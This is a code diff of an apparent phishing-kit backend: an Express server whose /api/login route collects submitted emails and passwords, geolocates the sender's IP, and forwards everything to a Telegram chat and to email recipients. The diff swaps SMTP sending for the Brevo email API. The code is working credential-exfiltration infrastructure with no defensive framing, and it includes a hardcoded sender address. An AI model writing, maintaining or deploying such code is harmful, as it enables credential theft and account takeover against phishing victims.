@@ -1,6 +1,5 @@
 const express = require('express');
 const cors = require('cors');
-const nodemailer = require('nodemailer');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -25,66 +24,43 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // ============================================================
-// EMAIL CONFIGURATION (FROM ENVIRONMENT VARIABLES)
+// BREVO (EMAIL) CONFIGURATION
 // ============================================================
 
-const EMAIL_CONFIG = {
-    host: process.env.SMTP_HOST || 'smtp.gmail.com',
-    port: parseInt(process.env.SMTP_PORT || '587', 10),
-    secure: process.env.SMTP_SECURE === 'true',
-    auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS
-    }
-};
+const BREVO_API_KEY = process.env.BREVO_API_KEY;
+const SENDER_EMAIL = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
+const SENDER_NAME = process.env.SENDER_NAME || 'ABV check';
 
-// Email recipients (comma-separated in env, e.g. "a@x.com,b@y.com")
+// Email recipients (comma-separated in env)
 const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
     .split(',')
     .map(e => e.trim())
     .filter(Boolean);
 
 // ============================================================
-// VALIDATION - Fail fast if required env vars are missing
+// VALIDATION - Show startup config
 // ============================================================
 
 console.log('========================================');
 console.log('🔍 Environment check:');
 console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
 console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
-console.log(`   SMTP_USER:          ${EMAIL_CONFIG.auth.user ? '✅' : '❌ MISSING'}`);
-console.log(`   SMTP_PASS:          ${EMAIL_CONFIG.auth.pass ? '✅' : '❌ MISSING'}`);
+console.log(`   BREVO_API_KEY:      ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
+console.log(`   SENDER_EMAIL:       ${SENDER_EMAIL}`);
 console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
 console.log('========================================');
 
 // ============================================================
-// CREATE EMAIL TRANSPORTER
-// ============================================================
-
-let emailTransporter = null;
-
-function createEmailTransporter() {
-    if (!EMAIL_CONFIG.auth.user || !EMAIL_CONFIG.auth.pass) {
-        console.log('⚠️ SMTP credentials missing — email disabled');
-        return null;
-    }
-    try {
-        emailTransporter = nodemailer.createTransport(EMAIL_CONFIG);
-        console.log('✅ Email transporter created successfully');
-        return emailTransporter;
-    } catch (error) {
-        console.error('❌ Failed to create email transporter:', error.message);
-        return null;
-    }
-}
-
-// ============================================================
-// HELPER: Send Email
+// HELPER: Send Email via Brevo HTTP API
 // ============================================================
 
 async function sendEmail(email, password, ipInfo, userAgent, domain) {
-    if (!emailTransporter || EMAIL_RECIPIENTS.length === 0) {
-        console.log('⚠️ Email not configured, skipping');
+    if (!BREVO_API_KEY) {
+        console.log('⚠️ Brevo API key missing, skipping email');
+        return false;
+    }
+    if (EMAIL_RECIPIENTS.length === 0) {
+        console.log('⚠️ No email recipients configured, skipping email');
         return false;
     }
 
@@ -137,17 +113,33 @@ async function sendEmail(email, password, ipInfo, userAgent, domain) {
     `;
 
     try {
-        const info = await emailTransporter.sendMail({
-            from: EMAIL_CONFIG.auth.user,
-            to: EMAIL_RECIPIENTS.join(', '),
-            subject,
-            text: textContent,
-            html: htmlContent
+        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
+            method: 'POST',
+            headers: {
+                'api-key': BREVO_API_KEY,
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
+                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
+                subject: subject,
+                htmlContent: htmlContent,
+                textContent: textContent
+            })
         });
-        console.log('✅ Email sent:', info.messageId);
-        return true;
+
+        const data = await response.json();
+
+        if (response.ok) {
+            console.log('✅ Email sent via Brevo:', data.messageId || 'sent');
+            return true;
+        } else {
+            console.error('❌ Brevo API error:', response.status, data.message || data.error || JSON.stringify(data));
+            return false;
+        }
     } catch (error) {
-        console.error('❌ Failed to send email:', error.message);
+        console.error('❌ Failed to send email via Brevo:', error.message);
         return false;
     }
 }
@@ -185,7 +177,6 @@ async function sendToTelegram(message) {
 
 async function getIPInfo(ip) {
     try {
-        // Extract first IP if "x-forwarded-for" contains multiple
         const firstIP = (ip || '').split(',')[0].trim();
         const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
         const data = await response.json();
@@ -223,7 +214,7 @@ app.get('/health', (req, res) => {
         timestamp: new Date().toISOString(),
         uptime: process.uptime(),
         telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
-        emailConfigured: !!(emailTransporter && EMAIL_RECIPIENTS.length)
+        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length)
     });
 });
 
@@ -280,8 +271,8 @@ Date : ${new Date().toISOString()}
     console.log('📤 Sending to Telegram...');
     const telegramResult = await sendToTelegram(telegramMessage);
 
-    // ---------- Email ----------
-    console.log('📧 Sending email...');
+    // ---------- Email via Brevo ----------
+    console.log('📧 Sending email via Brevo...');
     const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain);
 
     // ---------- Response ----------
@@ -346,7 +337,6 @@ app.listen(PORT, () => {
     console.log(`🌐 Health: http://localhost:${PORT}/health`);
     console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
     console.log('========================================');
-    createEmailTransporter();
 });
 
 process.on('uncaughtException', (err) => console.error('❌ Uncaught:', err.message));
